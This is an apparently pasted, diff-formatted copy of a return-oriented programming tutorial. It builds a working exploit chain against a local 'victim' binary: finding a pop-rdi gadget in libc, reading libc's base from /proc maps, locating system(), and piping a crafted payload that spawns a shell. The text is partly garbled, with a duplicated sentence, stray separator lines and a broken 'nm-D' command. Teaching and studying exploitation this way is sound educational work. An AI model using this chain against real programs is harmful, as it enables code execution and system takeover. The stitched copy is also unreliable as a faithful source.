@@ -1,0 +1,122 @@
+The snippets of code are handpicked from executable memory: for example, they might be fragments of libc. Hence the NX bit is powerless to stop us. In more detail:
+
+    We start with SP pointing to the start of a series of addresses. A RET instruction kicks things off.
+
+    Forget RET’s usual meaning of returning from a subroutine. Instead, focus on its effects: RET jumps to the address in the memory location held by SP, and increments SP by 8 (on a 64-bit system).
+
+    After executing a few instructions, we encounter a RET. See step 2.
+
+In return-oriented programming, a sequence of instructions ending in RET is called a gadget.
+
+*************************************************************************
+
+execstack -c victim
+
+Go go gadgets
+
+Our mission is to call the libc system() function with "/bin/sh" as the argument. We can do this by calling a gadget that assigns a chosen value to RDI and then jump to the system() libc function. 
+
+First, where’s libc?
+
+$ locate libc.so
+/lib/i386-linux-gnu/libc.so.6
+/lib/x86_64-linux-gnu/libc.so.6
+/lib32/libc.so.6
+/usr/lib/x86_64-linux-gnu/libc.so
+
+Next, what kind of gadgets are available anyway?
+
+$ objdump -d /lib/x86_64-linux-gnu/libc.so.6 | grep -B5 ret
+
+We can do better. In our case, we would very much like to execute:
+
+pop  %rdi
+retq
+
+We settle for an ugly workaround:
+
+$ xxd -c1 -p /lib/x86_64-linux-gnu/libc.so.6 | grep -n -B1 c3 | grep 5f -m1 | awk '{printf"%x\n",$1-1}'
+22a12
+
+In other words:
+
+    Dump the library, one hex code per line.
+
+    Look for "c3", and print one line of leading context along with the matches. We also print the line numbers.
+
+    Look for the first "5f" match within the results.
+
+    As line numbers start from 1 and offsets start from 0, we must subtract 1 to get the latter from the former. Also, we want the address in hexadecimal. Asking Awk to treat the first argument as a number (due to the subtraction) conveniently drops all the characters after the digits, namely the "-5f" that grep outputs.
+
+We’re almost there. If we overwrite the return address with the following sequence:
+
+    libc’s address + 0x22a12
+
+    address of "/bin/sh"
+
+    address of libc’s system() function
+
+then on executing the next RET instruction, the program will pop the address of "/bin/sh" into RDI thanks to the first gadget, then jump to the system function.
+
+
+then on executing the next RET instruction, the program will pop the address of "/bin/sh" into RDI thanks to the first gadget, then jump to the system function.
+
+
+########
+
+
+Many happy returns
+
+In one terminal, run:
+
+$ setarch `arch` -R ./victim
+
+And in another:
+
+$ pid=`ps -C victim -o pid --no-headers | tr -d ' '`
+$ grep libc /proc/$pid/maps
+7ffff7a1d000-7ffff7bd0000 r-xp 00000000 08:05 7078182                    /lib/x86_64-linux-gnu/libc-2.15.so
+7ffff7bd0000-7ffff7dcf000 ---p 001b3000 08:05 7078182                    /lib/x86_64-linux-gnu/libc-2.15.so
+7ffff7dcf000-7ffff7dd3000 r--p 001b2000 08:05 7078182                    /lib/x86_64-linux-gnu/libc-2.15.so
+7ffff7dd3000-7ffff7dd5000 rw-p 001b6000 08:05 7078182                    /lib/x86_64-linux-gnu/libc-2.15.so
+
+Thus libc is loaded into memory starting at 0x7ffff7a1d000. That gives us our first ingredient: the address of the gadget is 0x7ffff7a1d000 + 0x22a12.
+
+*******************************************************************************************************************************************************
+
+Next we want "/bin/sh" somewhere in memory. We can proceed similarly to before and place this string at the beginning of the buffer. From before, its address is 0x7fffffffe090. 
+
+******************************************************************************************************************************************************
+
+The final ingredient is the location of the system library function.
+
+$  nm-D /lib/x86_64-linux-gnu/libc.so.6 | grep '\<system\>'
+0000000000044320 W system
+
+***********************************************************                      *********************************************************************
+
+Gotcha! The system function lives at 0x7ffff7a1d000 + 0x44320.
+
+*******************************************************************************************************************************************************
+ Putting it all together:
+
+
+
+
+
+
+$ (echo -n /bin/sh | xxd -p; printf %0130d 0;
+printf %016x $((0x7ffff7a1d000+0x22a12)) | tac -rs..;
+printf %016x 0x7fffffffe090 | tac -rs..;
+printf %016x $((0x7ffff7a1d000+0x44320)) | tac -rs..) |
+xxd -r -p | setarch `arch` -R ./victim
+
+Hit enter a few times, then type in some commands to confirm this indeed spawns a shell.
+
+There are 130 0s this time, which xxd turns into 65 zero bytes. This is exactly enough to cover the rest of the buffer after "/bin/sh" as well as the pushed RBP register, so that the very next location we overwrite is the top of the stack.
+
+
+
+
+### http://crypto.stanford.edu/~blynn/rop/
+
